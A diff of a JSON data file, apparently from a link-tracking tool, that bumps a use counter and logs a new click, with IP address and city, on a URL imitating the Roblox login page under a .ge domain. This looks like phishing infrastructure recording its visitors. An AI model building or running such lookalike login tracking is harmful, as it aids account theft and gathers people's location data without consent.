@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1368,
+    "useCount": 1369,
     "createdBy": "admin",
     "clicks": [
       {
@@ -11112,6 +11112,14 @@
         "city": "Fresnillo",
         "flag": "🇲🇽",
         "countryCode": "MX"
+      },
+      {
+        "timestamp": 1777420762344,
+        "ip": "49.147.101.39",
+        "country": "Philippines",
+        "city": "Iloilo City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
